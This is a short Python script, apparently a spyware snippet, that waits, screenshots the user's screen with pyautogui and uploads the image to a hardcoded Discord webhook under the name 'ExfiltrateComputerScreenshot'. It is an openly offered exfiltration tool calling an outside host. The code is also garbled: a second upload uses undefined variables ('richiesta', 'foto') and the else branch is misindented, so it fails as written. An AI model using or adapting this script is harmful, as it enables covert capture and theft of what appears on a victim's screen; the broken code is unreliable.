import pyautogui
from time import sleep
import requests

# Your webhook
discord_webhook = "https://discord.com/api/webhooks/1356971307547361501/IGX0ZvQYPn7RFgYd6d7wpoL9xzCSL3EZ_VBjEzfimSs7eDidDMKHv12ncQmdgjOmWXVU"


# Settings
SCREENSHOTS = 1
TIMING = 10

for i in range(SCREENSHOTS):
    sleep(TIMING)

    # Screenshot speichern
    screenshot = pyautogui.screenshot()
    filename = f"screenshot_{i}.png"
    screenshot.save(filename)

    with open(filename, "rb") as f:
        files = {"file": (filename, f, "image/png")}
        data = {
            "username": "ExfiltrateComputerScreenshot",
            "content": f"Screenshot #{i}"
        }

        response = requests.post(discord_webhook, data=data, files=files)


    # Send the message by attaching the photo
    response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})

    # Useful for debugging
    if response.status_code == 200:
        print("Photo successfully sent!")
     else:
         print("Error while submitting photo." + str(response.status_code))
